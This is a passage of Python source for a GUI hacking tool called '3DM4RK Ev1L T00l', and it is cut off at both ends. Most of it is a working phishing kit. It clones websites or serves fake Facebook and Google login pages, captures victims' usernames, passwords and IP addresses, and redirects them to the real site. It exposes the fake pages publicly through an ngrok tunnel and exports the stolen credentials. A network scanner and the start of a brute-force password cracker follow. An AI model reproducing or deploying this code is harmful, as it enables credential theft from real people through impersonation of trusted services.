        copy_wan_url_btn.pack(side='left', padx=(0, 10))
        open_browser_btn = ttk.Button(url_actions_frame, text="OPEN IN BROWSER", command=self.open_phishing_page, style='Evil.TButton')
        open_browser_btn.pack(side='left')
        
        close_btn = ttk.Button(main_frame,
                             text="CLOSE",
                             command=lambda: parent.winfo_toplevel().destroy(),
                             style='Evil.TButton')
        close_btn.pack(pady=10)
    
    def setup_wan_tab(self, parent):
        """Setup WAN configuration tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame, text="WAN MODE CONFIGURATION", style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # WAN Mode Section
        wan_frame = ttk.LabelFrame(main_frame, text=" WAN Mode Settings ", style='Evil.TLabel', padding=10)
        wan_frame.pack(fill='x', pady=10)
        
        self.wan_mode_var = tk.BooleanVar(value=self.wan_mode)
        wan_mode_cb = ttk.Checkbutton(wan_frame, text="Enable WAN Mode (Ngrok Tunneling)", variable=self.wan_mode_var, command=self.toggle_wan_mode, style='Evil.TLabel')
        wan_mode_cb.pack(anchor='w', pady=5)
        
        # Ngrok Status
        status_frame = ttk.Frame(wan_frame, style='Scan.TFrame')
        status_frame.pack(fill='x', pady=5)
        ttk.Label(status_frame, text="Ngrok Status:", style='Evil.TLabel').pack(side='left')
        self.ngrok_status_label = ttk.Label(status_frame, text="Ngrok: Not Started", style='Info.TLabel')
        self.ngrok_status_label.pack(side='left', padx=(10, 0))
        
        # Ngrok Download Section
        download_frame = ttk.LabelFrame(main_frame, text=" Ngrok Setup ", style='Evil.TLabel', padding=10)
        download_frame.pack(fill='x', pady=10)
        
        download_btn = ttk.Button(download_frame, text="DOWNLOAD NGROK", command=self.download_ngrok, style='Evil.TButton')
        download_btn.pack(anchor='w', pady=5)
        
        # Ngrok Authtoken Section
        authtoken_frame = ttk.LabelFrame(main_frame, text=" Ngrok Authentication ", style='Evil.TLabel', padding=10)
        authtoken_frame.pack(fill='x', pady=10)
        
        authtoken_grid = ttk.Frame(authtoken_frame, style='Scan.TFrame')
        authtoken_grid.pack(fill='x')
        
        ttk.Label(authtoken_grid, text="Ngrok Authtoken:", style='Evil.TLabel').grid(row=0, column=0, sticky='w', padx=(0, 10))
        self.ngrok_authtoken_var = tk.StringVar()
        authtoken_entry = ttk.Entry(authtoken_grid, textvariable=self.ngrok_authtoken_var, width=30, show="•", style='Evil.TEntry')
        authtoken_entry.grid(row=0, column=1, sticky='w', padx=(0, 10))
        
        set_authtoken_btn = ttk.Button(authtoken_grid, text="SET AUTHTOKEN", command=self.set_ngrok_authtoken, style='Evil.TButton')
        set_authtoken_btn.grid(row=0, column=2, padx=(0, 10))
        
        info_label = ttk.Label(authtoken_frame, text="Note: Ngrok creates secure tunnels to localhost. Download ngrok.exe first if not present.", style='Info.TLabel')
        info_label.pack(anchor='w', pady=(5, 0))
        
        # Initialize ngrok status
        self.check_ngrok_status()
        self.toggle_wan_mode()
    
    def setup_credentials_tab(self, parent):
        """Setup credentials display tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame, text="CAPTURED CREDENTIALS", style='Section.TLabel')
        title_label.pack(pady=(0, 10))
        
        count_label = ttk.Label(main_frame, text=f"Total Captured: {len(self.captured_credentials)}", style='Info.TLabel')
        count_label.pack(pady=(0, 10))
        
        self.credentials_text = scrolledtext.ScrolledText(main_frame, height=25, bg='#1a1a1a', fg='#ff4444', font=('Courier', 9))
        self.credentials_text.pack(fill='both', expand=True, pady=5)
        
        # Control buttons
        buttons_frame = ttk.Frame(main_frame, style='Scan.TFrame')
        buttons_frame.pack(fill='x', pady=10)
        
        clear_btn = ttk.Button(buttons_frame, text="CLEAR CREDENTIALS", command=self.clear_credentials, style='Evil.TButton')
        clear_btn.pack(side='left', padx=(0, 10))
        
        save_btn = ttk.Button(buttons_frame, text="SAVE TO FILE", command=self.save_credentials, style='Evil.TButton')
        save_btn.pack(side='left', padx=(0, 10))
        
        export_btn = ttk.Button(buttons_frame, text="EXPORT AS TEXT", command=self.export_credentials, style='Evil.TButton')
        export_btn.pack(side='left')
        
        self.refresh_credentials_display()

    # All the original phishing functionality methods remain exactly the same
    def check_ngrok_status(self):
        """Check if ngrok is available"""
        if os.path.exists("ngrok.exe"):
            self.ngrok_status_label.config(text="Ngrok: Ready")
            return True
        else:
            self.ngrok_status_label.config(text="Ngrok: Not Found")
            return False

    def download_ngrok(self):
        """Download ngrok executable"""
        try:
            self.ngrok_status_label.config(text="Ngrok: Downloading...")
            
            # Ngrok download URLs for different architectures
            system = platform.system().lower()
            machine = platform.machine().lower()
            
            if system == "windows":
                if "64" in machine:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
                else:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-386.zip"
            elif system == "linux":
                if "64" in machine:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
                else:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz"
            elif system == "darwin":  # macOS
                if "arm" in machine:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip"
                else:
                    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
            else:
                messagebox.showerror("Unsupported System", "Your system is not supported for automatic ngrok download.")
                return
            
            # Download and extract ngrok
            download_path = "ngrok_download.zip" if system == "windows" else "ngrok_download.tgz"
            
            # Download file
            urllib.request.urlretrieve(url, download_path)
            
            # Extract file
            if system == "windows":
                import zipfile
                with zipfile.ZipFile(download_path, 'r') as zip_ref:
                    zip_ref.extractall(".")
            else:
                import tarfile
                with tarfile.open(download_path, 'r:gz') as tar_ref:
                    tar_ref.extractall(".")
            
            # Clean up
            os.remove(download_path)
            
            # Make executable on Unix systems
            if system != "windows":
                os.chmod("ngrok", 0o755)
            
            self.ngrok_status_label.config(text="Ngrok: Ready")
            messagebox.showinfo("Download Complete", "ngrok has been downloaded successfully!")
            
        except Exception as e:
            self.ngrok_status_label.config(text="Ngrok: Download Failed")
            messagebox.showerror("Download Error", f"Failed to download ngrok: {str(e)}")

    def set_ngrok_authtoken(self):
        """Set ngrok authtoken"""
        authtoken = self.ngrok_authtoken_var.get().strip()
        if not authtoken:
            messagebox.showwarning("Missing Authtoken", "Please enter your ngrok authtoken.")
            return
        
        if not self.check_ngrok_status():
            messagebox.showwarning("Ngrok Not Found", "Please download ngrok first.")
            return
        
        try:
            # Set ngrok authtoken
            result = subprocess.run([
                "ngrok", "config", "add-authtoken", authtoken
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                messagebox.showinfo("Success", "Ngrok authtoken set successfully!")
                self.ngrok_status_label.config(text="Ngrok: Authenticated")
            else:
                messagebox.showerror("Error", f"Failed to set authtoken: {result.stderr}")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to set ngrok authtoken: {str(e)}")

    def toggle_wan_mode(self):
        """Toggle WAN mode and update UI accordingly"""
        self.wan_mode = self.wan_mode_var.get()
        
        if self.wan_mode:
            if not self.check_ngrok_status():
                messagebox.showwarning("Ngrok Not Found", 
                                     "ngrok.exe not found. Please download ngrok first or disable WAN mode.")
                self.wan_mode_var.set(False)
                self.wan_mode = False
                return
            
            self.update_wan_url_display("WAN mode enabled - Start server to get URL")
        else:
            self.update_wan_url_display("WAN mode disabled")

    def start_phishing_server(self):
        """Start the phishing server with optional ngrok tunneling"""
        try:
            port = int(self.port_var.get())
            
            if not os.path.exists("phishing_pages"):
                os.makedirs("phishing_pages")
            
            if self.template_var.get() == "custom" and not self.custom_url_to_clone:
                if not messagebox.askyesno("Custom URL Required", 
                                         "Custom template selected but no URL set. Do you want to set a custom URL to clone?"):
                    return
                self.set_custom_clone_url()
                if not self.custom_url_to_clone:
                    return
            
            self.generate_phishing_page(self.template_var.get())
            
            # Start the local server
            self.is_server_running = True
            self.server_thread = threading.Thread(target=self.run_phishing_server, args=(port,))
            self.server_thread.daemon = True
            self.server_thread.start()
            
            # Start ngrok tunnel if WAN mode is enabled
            if self.wan_mode:
                self.start_ngrok_tunnel(port)
            
            self.start_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            
            if self.wan_mode:
                self.server_status.config(text=f"Server Status: RUNNING on port {port} + Ngrok")
            else:
                self.server_status.config(text=f"Server Status: RUNNING on port {port}")
            
            self.update_server_urls(port)
            
            messagebox.showinfo("Server Started", f"Phishing server started!\n\nPort: {port}\n" + 
                              ("WAN Mode: Enabled (Ngrok)" if self.wan_mode else "Local Mode: Enabled"))
            
        except Exception as e:
            messagebox.showerror("Server Error", f"Failed to start server:\n{str(e)}")

    def start_ngrok_tunnel(self, port):
        """Start ngrok tunnel for the specified port"""
        try:
            self.ngrok_status_label.config(text="Ngrok: Starting tunnel...")
            
            # Start ngrok process
            self.ngrok_process = subprocess.Popen([
                "ngrok", "http", str(port)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for ngrok to start and get the URL
            time.sleep(3)  # Give ngrok time to start
            
            # Get ngrok public URL in a separate thread to not block UI
            ngrok_thread = threading.Thread(target=self.wait_for_ngrok_url)
            ngrok_thread.daemon = True
            ngrok_thread.start()
            
        except Exception as e:
            self.ngrok_status_label.config(text="Ngrok: Failed to start")
            messagebox.showwarning("Ngrok Error", f"Failed to start ngrok tunnel: {str(e)}")

    def wait_for_ngrok_url(self):
        """Wait for ngrok to be ready and get the public URL"""
        max_attempts = 10
        for attempt in range(max_attempts):
            try:
                ngrok_url = self.get_ngrok_url()
                if ngrok_url:
                    self.root.after(0, self.update_wan_url_display, ngrok_url)
                    self.root.after(0, lambda: self.ngrok_status_label.config(text="Ngrok: Tunnel Active"))
                    return
                time.sleep(1)
            except:
                time.sleep(1)
        
        # If we get here, ngrok failed to provide a URL
        self.root.after(0, self.update_wan_url_display, "Failed to get Ngrok URL")
        self.root.after(0, lambda: self.ngrok_status_label.config(text="Ngrok: Error"))

    def get_ngrok_url(self):
        """Get the public URL from ngrok"""
        try:
            # Use ngrok API to get tunnel information
            response = urllib.request.urlopen("http://localhost:4040/api/tunnels", timeout=5)
            data = json.loads(response.read().decode())
            
            tunnels = data.get('tunnels', [])
            for tunnel in tunnels:
                if tunnel.get('proto') == 'https':
                    return tunnel.get('public_url')
            
            return None
            
        except Exception as e:
            print(f"Failed to get ngrok URL: {e}")
            return None

    def stop_phishing_server(self):
        """Stop the phishing server and ngrok tunnel"""
        self.is_server_running = False
        
        # Stop ngrok if running
        if hasattr(self, 'ngrok_process') and self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None
            self.ngrok_status_label.config(text="Ngrok: Stopped")
        
        # Stop local server
        if self.phishing_server:
            self.phishing_server.shutdown()
        
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.server_status.config(text="Server Status: STOPPED")
        
        if self.wan_mode:
            self.update_wan_url_display("WAN mode enabled - Start server to get URL")
        
        messagebox.showinfo("Server Stopped", "Phishing server has been stopped")

    def update_server_urls(self, port):
        """Update the server URL displays"""
        # Update local URL
        self.local_url_text.config(state='normal')
        self.local_url_text.delete('1.0', 'end')
        self.local_url_text.insert('1.0', f"http://localhost:{port}")
        self.local_url_text.config(state='disabled')
        
        # Update network URL
        self.network_url_text.config(state='normal')
        self.network_url_text.delete('1.0', 'end')
        self.network_url_text.insert('1.0', f"http://{self.local_ip}:{port}")
        self.network_url_text.config(state='disabled')
        
        # WAN URL is updated by ngrok separately

    def update_wan_url_display(self, url):
        """Update the WAN URL display"""
        self.wan_url_text.config(state='normal')
        self.wan_url_text.delete('1.0', 'end')
        self.wan_url_text.insert('1.0', url)
        self.wan_url_text.config(state='disabled')

    def copy_wan_url(self):
        """Copy WAN URL to clipboard"""
        wan_url = self.wan_url_text.get('1.0', 'end-1c').strip()
        if wan_url and wan_url != "WAN mode disabled - Start server with WAN mode enabled" and not wan_url.startswith("Failed"):
            self.root.clipboard_clear()
            self.root.clipboard_append(wan_url)
            messagebox.showinfo("Copied", "WAN URL copied to clipboard!")
        else:
            messagebox.showwarning("No URL", "No valid WAN URL available to copy.")

    def open_phishing_page(self):
        """Open the phishing page in default browser"""
        if self.is_server_running:
            if self.wan_mode:
                wan_url = self.wan_url_text.get('1.0', 'end-1c').strip()
                if wan_url and wan_url.startswith("http"):
                    webbrowser.open(wan_url)
                else:
                    messagebox.showwarning("WAN Mode", "WAN mode is enabled but no valid URL available yet.")
            else:
                port = self.port_var.get()
                webbrowser.open(f"http://localhost:{port}")
        else:
            messagebox.showwarning("Server Not Running", "Start the server first!")

    def on_template_selected(self, event):
        """Handle template selection change"""
        selected_template = self.template_var.get()
        
        if selected_template == "facebook":
            self.custom_url_var.set("https://www.facebook.com")
        elif selected_template == "google":
            self.custom_url_var.set("https://www.google.com")
        elif selected_template == "twitter":
            self.custom_url_var.set("https://www.twitter.com")
        elif selected_template == "instagram":
            self.custom_url_var.set("https://www.instagram.com")
        elif selected_template == "linkedin":
            self.custom_url_var.set("https://www.linkedin.com")
        elif selected_template == "custom":
            pass

    def set_custom_clone_url(self):
        """Set custom URL to clone for phishing"""
        if self.template_var.get() != "custom":
            messagebox.showwarning("Wrong Template", "Please select 'custom' template first!")
            return
        
        url = simpledialog.askstring("Custom Phishing URL", 
                                   "Enter the URL to clone for phishing:",
                                   initialvalue="https://")
        
        if url:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            self.custom_url_to_clone = url
            self.custom_clone_label.config(text=f"Custom URL to clone: {url}")
            
            if messagebox.askyesno("Clone Website", "Do you want to clone this website now?"):
                self.clone_website(url)

    def clone_website(self, url):
        """Clone a website for phishing"""
        try:
            self.server_status.config(text="Cloning website... Please wait")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            req = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(req, timeout=10)
            html_content = response.read().decode('utf-8')
            
            soup = BeautifulSoup(html_content, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                if form.get('action'):
                    form['action'] = '/login'
                else:
                    form['action'] = '/login'
            
            if forms:
                hidden_input = soup.new_tag('input')
                hidden_input['type'] = 'hidden'
                hidden_input['name'] = 'cloned_from'
                hidden_input['value'] = url
                forms[0].insert(0, hidden_input)
            
            self.custom_html_content = str(soup)
            
            if not os.path.exists("phishing_pages"):
                os.makedirs("phishing_pages")
            
            with open("phishing_pages/index.html", "w", encoding='utf-8') as f:
                f.write(self.custom_html_content)
            
            self.server_status.config(text=f"Website cloned successfully: {url}")
            messagebox.showinfo("Success", f"Website cloned successfully!\n\nURL: {url}")
            
        except Exception as e:
            error_msg = f"Failed to clone website: {str(e)}"
            self.server_status.config(text=error_msg)
            messagebox.showerror("Clone Error", error_msg)

    def run_phishing_server(self, port):
        """Run the phishing HTTP server"""
        handler = self.PhishingHTTPRequestHandler
        with socketserver.TCPServer(("", port), handler) as httpd:
            self.phishing_server = httpd
            httpd.gui_instance = self
            httpd.template = self.template_var.get()
            httpd.custom_url = self.custom_url_var.get()
            print(f"Phishing server running on port {port}")
            httpd.serve_forever()

    def clear_credentials(self):
        """Clear captured credentials"""
        if messagebox.askyesno("Confirm Clear", "Are you sure you want to clear all captured credentials?"):
            self.captured_credentials.clear()
            self.credentials_text.delete('1.0', 'end')
            self.save_credentials()

    def save_credentials(self):
        """Save credentials to JSON file"""
        try:
            with open(self.credentials_file, 'w') as f:
                json.dump(self.captured_credentials, f, indent=2)
            messagebox.showinfo("Success", f"Credentials saved to {self.credentials_file}")
        except Exception as e:
            messagebox.showerror("Save Error", f"Failed to save credentials: {str(e)}")

    def export_credentials(self):
        """Export credentials as text file"""
        try:
            export_file = "credentials_export.txt"
            with open(export_file, 'w') as f:
                f.write("3DM4RK Ev1L T00l - Captured Credentials Export\n")
                f.write("=" * 50 + "\n")
                f.write(f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Credentials: {len(self.captured_credentials)}\n")
                f.write("=" * 50 + "\n\n")
                
                for i, cred in enumerate(self.captured_credentials, 1):
                    f.write(f"Credential #{i}:\n")
                    f.write(f"  Username: {cred.get('username', 'N/A')}\n")
                    f.write(f"  Password: {cred.get('password', 'N/A')}\n")
                    f.write(f"  Template: {cred.get('template', 'N/A')}\n")
                    f.write(f"  Client IP: {cred.get('client_ip', 'N/A')}\n")
                    f.write(f"  Timestamp: {cred.get('timestamp', 'N/A')}\n")
                    f.write("-" * 30 + "\n\n")
            
            messagebox.showinfo("Export Success", f"Credentials exported to {export_file}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export credentials: {str(e)}")

    def refresh_credentials_display(self):
        """Refresh the credentials display"""
        self.credentials_text.delete('1.0', 'end')
        for cred in self.captured_credentials:
            timestamp = cred.get('timestamp', 'Unknown')
            self.credentials_text.insert('end', f"[{timestamp}]\n")
            self.credentials_text.insert('end', f"Username: {cred.get('username', 'N/A')}\n")
            self.credentials_text.insert('end', f"Password: {cred.get('password', 'N/A')}\n")
            self.credentials_text.insert('end', f"Template: {cred.get('template', 'N/A')}\n")
            self.credentials_text.insert('end', f"IP: {cred.get('client_ip', 'N/A')}\n")
            self.credentials_text.insert('end', "-" * 50 + "\n\n")

    def add_captured_credential(self, credential):
        """Add captured credential to display and auto-save if enabled"""
        self.captured_credentials.append(credential)
        
        self.refresh_credentials_display()
        
        if self.auto_save_var.get():
            self.save_credentials()

    def generate_phishing_page(self, template):
        """Generate phishing page HTML based on template"""
        if template == "custom" and self.custom_html_content:
            html_content = self.custom_html_content
        else:
            if template == "facebook":
                html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { text-align: center; color: #1877f2; font-size: 48px; font-weight: bold; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        input[type="submit"] { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .forgot { text-align: center; margin: 10px 0; }
        .create { text-align: center; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div class="forgot"><a href="#">Forgotten password?</a></div>
        <div class="create"><a href="#" style="background: #42b72a; color: white; padding: 12px; text-decoration: none; border-radius: 6px;">Create New Account</a></div>
    </div>
</body>
</html>
                """
            elif template == "google":
                html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
        .header { text-align: right; padding: 20px; }
        .container { max-width: 400px; margin: 100px auto; text-align: center; }
        .logo { font-size: 80px; font-weight: bold; margin-bottom: 20px; }
        .logo span:nth-child(1) { color: #4285f4; }
        .logo span:nth-child(2) { color: #ea4335; }
        .logo span:nth-child(3) { color: #fbbc05; }
        .logo span:nth-child(4) { color: #4285f4; }
        .logo span:nth-child(5) { color: #34a853; }
        .logo span:nth-child(6) { color: #ea4335; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dfe1e5; border-radius: 24px; font-size: 16px; }
        input[type="submit"] { background: #4285f4; color: white; border: none; padding: 10px 20px; border-radius: 4px; margin: 10px 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <a href="#">Gmail</a> | <a href="#">Images</a> | <a href="#">Sign in</a>
    </div>
    <div class="container">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="submit" value="Next">
            <input type="submit" value="Forgot password?">
        </form>
    </div>
</body>
</html>
                """
            else:
                html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Login - {template.title()}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }}
        .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; color: #1877f2; font-size: 36px; font-weight: bold; margin-bottom: 20px; }}
        input[type="text"], input[type="password"] {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }}
        input[type="submit"] {{ width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{template.title()} Login</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
    </div>
</body>
</html>
                """
        
        with open("phishing_pages/index.html", "w", encoding='utf-8') as f:
            f.write(html_content)
    
    class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            """Handle GET requests"""
            if self.path == '/':
                self.path = '/phishing_pages/index.html'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        def do_POST(self):
            """Handle POST requests (login attempts)"""
            if self.path == '/login':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                parsed_data = parse_qs(post_data)
                username = parsed_data.get('username', [''])[0]
                password = parsed_data.get('password', [''])[0]
                cloned_from = parsed_data.get('cloned_from', [''])[0]
                
                client_ip = self.client_address[0]
                
                credential = {
                    'username': username,
                    'password': password,
                    'template': getattr(self.server, 'template', 'unknown'),
                    'client_ip': client_ip,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'cloned_from': cloned_from if cloned_from else 'N/A'
                }
                
                if hasattr(self.server, 'gui_instance'):
                    self.server.gui_instance.root.after(0, 
                        lambda: self.server.gui_instance.add_captured_credential(credential))
                
                print(f"Captured credentials from {client_ip}: {username}:{password}")
                
                redirect_url = getattr(self.server, 'custom_url', 'https://www.facebook.com')
                self.send_response(302)
                self.send_header('Location', redirect_url)
                self.end_headers()
                
                return
            
            self.send_error(404)
        
        def log_message(self, format, *args):
            """Override to suppress default server logs"""
            return

    # NETWORK SCANNER FUNCTIONALITY - Keeping original functionality with enhanced GUI
    def network_scanner(self):
        """Network scanner with actual scanning functionality"""
        self.show_network_scanner_window()
    
    def show_network_scanner_window(self):
        """Enhanced network scanner interface"""
        scanner_window = tk.Toplevel(self.root)
        scanner_window.title("3DM4RK - Network Scanner")
        scanner_window.geometry("800x600")
        scanner_window.configure(bg='#2b2b2b')
        scanner_window.resizable(True, True)
        
        self.center_child_window(scanner_window, 800, 600)
        
        main_frame = ttk.Frame(scanner_window, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame,
                              text="NETWORK SCANNER",
                              style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Controls Section
        controls_frame = ttk.LabelFrame(main_frame, 
                                      text=" Scan Controls ",
                                      style='Evil.TLabel',
                                      padding=10)
        controls_frame.pack(fill='x', pady=10)
        
        controls_grid = ttk.Frame(controls_frame, style='Evil.TLabel')
        controls_grid.pack(fill='x')
        
        ttk.Label(controls_grid, text="Network Range:", style='Evil.TLabel').grid(row=0, column=0, padx=(0, 10))
        
        network_base = ".".join(self.local_ip.split(".")[:3]) + ".0/24"
        self.range_var = tk.StringVar(value=network_base)
        
        range_entry = ttk.Entry(controls_grid,
                               textvariable=self.range_var,
                               width=20,
                               style='Evil.TEntry')
        range_entry.grid(row=0, column=1, padx=(0, 20))
        
        scan_btn = ttk.Button(controls_grid,
                             text="START SCAN",
                             command=self.start_network_scan,
                             style='Evil.TButton')
        scan_btn.grid(row=0, column=2, padx=(0, 20))
        
        self.scan_progress = ttk.Progressbar(controls_grid,
                                           mode='indeterminate')
        self.scan_progress.grid(row=0, column=3, padx=(0, 10))
        
        self.scan_status = ttk.Label(controls_frame,
                                    text="Ready to scan",
                                    style='Info.TLabel')
        self.scan_status.pack(pady=5)
        
        # Results Section
        results_frame = ttk.LabelFrame(main_frame, 
                                     text=" Scan Results ",
                                     style='Evil.TLabel',
                                     padding=10)
        results_frame.pack(expand=True, fill='both', pady=10)
        
        columns = ('IP', 'Hostname', 'Computer Name', 'Status')
        self.results_tree = ttk.Treeview(results_frame, columns=columns, show='headings', style='Scan.Treeview')
        
        self.results_tree.heading('IP', text='IP Address')
        self.results_tree.heading('Hostname', text='Hostname')
        self.results_tree.heading('Computer Name', text='Computer Name')
        self.results_tree.heading('Status', text='Status')
        
        self.results_tree.column('IP', width=150)
        self.results_tree.column('Hostname', width=200)
        self.results_tree.column('Computer Name', width=200)
        self.results_tree.column('Status', width=100)
        
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=scrollbar.set)
        
        self.results_tree.pack(side=tk.LEFT, fill='both', expand=True)
        scrollbar.pack(side=tk.RIGHT, fill='y')
        
        close_btn = ttk.Button(main_frame,
                             text="CLOSE",
                             command=scanner_window.destroy,
                             style='Evil.TButton')
        close_btn.pack(pady=10)
    
    def start_network_scan(self):
        """Start the network scan in a separate thread"""
        self.scan_status.config(text="Scanning network...")
        self.scan_progress.start(10)
        
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        
        scan_thread = threading.Thread(target=self.perform_network_scan)
        scan_thread.daemon = True
        scan_thread.start()
    
    def perform_network_scan(self):
        """Perform the actual network scan"""
        try:
            network_range = self.range_var.get()
            
            network = ipaddress.IPv4Network(network_range, strict=False)
            
            discovered_hosts = []
            
            hosts_to_scan = list(network.hosts())[:50]
            
            for i, ip in enumerate(hosts_to_scan):
                ip_str = str(ip)
                
                self.root.after(0, self.update_scan_progress, i, len(hosts_to_scan), ip_str)
                
                if self.ping_host(ip_str):
                    hostname = self.get_hostname(ip_str)
                    computer_name = self.get_computer_name(ip_str)
                    
                    discovered_hosts.append({
                        'ip': ip_str,
                        'hostname': hostname,
                        'computer_name': computer_name,
                        'status': 'Online'
                    })
                    
                    self.root.after(0, self.add_scan_result, ip_str, hostname, computer_name, 'Online')
            
            self.root.after(0, self.scan_complete, len(discovered_hosts))
            
        except Exception as e:
            self.root.after(0, self.scan_error, str(e))
    
    def update_scan_progress(self, current, total, current_ip):
        """Update scan progress in GUI"""
        progress_text = f"Scanning: {current_ip} ({current+1}/{total})"
        self.scan_status.config(text=progress_text)
    
    def add_scan_result(self, ip, hostname, computer_name, status):
        """Add a result to the treeview"""
        self.results_tree.insert('', 'end', values=(ip, hostname, computer_name, status))
    
    def scan_complete(self, hosts_found):
        """Handle scan completion"""
        self.scan_progress.stop()
        self.scan_status.config(text=f"Scan complete! Found {hosts_found} online hosts")
    
    def scan_error(self, error_message):
        """Handle scan errors"""
        self.scan_progress.stop()
        self.scan_status.config(text=f"Scan error: {error_message}")
        messagebox.showerror("Scan Error", f"Network scan failed:\n{error_message}")
    
    def ping_host(self, ip):
        """Check if host is reachable using ping"""
        try:
            param = "-n" if platform.system().lower() == "windows" else "-c"
            
            command = ["ping", param, "1", "-W" if platform.system().lower() == "windows" else "-w", "1000", ip]
            
            result = subprocess.run(command, capture_output=True, text=True, timeout=2)
            
            return result.returncode == 0
        except:
            return False
    
    def get_hostname(self, ip):
        """Get hostname from IP address"""
        try:
            hostname = socket.getfqdn(ip)
            return hostname if hostname != ip else "Unknown"
        except:
            return "Unknown"
    
    def get_computer_name(self, ip):
        """Get computer name (NetBIOS name) - Windows specific"""
        try:
            if platform.system().lower() == "windows":
                result = subprocess.run(["nbtstat", "-A", ip], capture_output=True, text=True, timeout=3)
                lines = result.stdout.split('\n')
                for line in lines:
                    if "<00>" in line and "UNIQUE" in line:
                        parts = line.split()
                        if len(parts) > 0:
                            return parts[0]
            return "Unknown"
        except:
            return "Unknown"

    # PASSWORD CRACKER WITH AI DETECTION - Keeping original functionality
    def password_cracker(self):
        """Password cracker with brute force and AI detection"""
        self.show_password_cracker_window()
    
    def show_password_cracker_window(self):
        """Enhanced password cracker interface"""
        cracker_window = tk.Toplevel(self.root)
        cracker_window.title(f"3DM4RK - Password Cracker v{self.version}")
        cracker_window.geometry("800x700")
        cracker_window.configure(bg='#2b2b2b')
        cracker_window.resizable(True, True)
        
        self.center_child_window(cracker_window, 800, 700)
        
        # Create notebook for tabs
        notebook = ttk.Notebook(cracker_window)
        notebook.pack(expand=True, fill='both', padx=10, pady=10)
        
        # AI Detection Tab
        ai_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(ai_frame, text="🤖 AI Detection")
        
        # Brute Force Tab
        brute_frame = ttk.Frame(notebook, style='Scan.TFrame')
        notebook.add(brute_frame, text="🔓 Brute Force")
        
        self.setup_ai_detection_tab(ai_frame)
        self.setup_brute_force_tab(brute_frame)
    
    def setup_ai_detection_tab(self, parent):
